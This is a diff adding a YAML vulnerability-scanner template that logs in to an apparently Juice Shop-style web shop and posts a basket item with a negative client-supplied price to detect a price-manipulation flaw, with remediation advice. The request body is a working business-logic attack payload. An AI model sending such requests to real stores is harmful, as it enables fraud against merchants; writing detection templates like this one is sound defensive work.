@@ -1,0 +1,42 @@
+id: price-manipulation
+info:
+  name: Price Manipulation Business Logic Flaw
+  severity: critical
+  description: Detects if client-provided price is accepted without validation
+  tags:
+    - business-logic
+    - price-manipulation
+
+variables:
+  email: "{{USER_EMAIL}}"
+  password: "{{USER_PASSWORD}}"
+
+requests:
+  - name: Authenticate to get basket ID
+    method: POST
+    path: /rest/user/login
+    headers:
+      Content-Type: application/json
+    body: '{"email": "{{email}}", "password": "{{password}}"}'
+    extractors:
+      - type: json
+        name: basket_id
+        selector: "$.bid"
+      - type: json
+        name: auth_token
+        selector: "$.authentication.token"
+
+  - name: Add item with manipulated negative price
+    method: POST
+    path: /api/BasketItems
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer {{auth_token}}"
+    body: '{"ProductId": 1, "quantity": 1, "price": -999.99, "basketId": "{{basket_id}}"}'
+    matchers:
+      - type: status
+        values: [200, 201]
+    on_match:
+      vulnerability: PRICE_MANIPULATION
+      message: Server accepted request with client-provided negative price
+      remediation: Never accept price from client; always use server-side product catalog
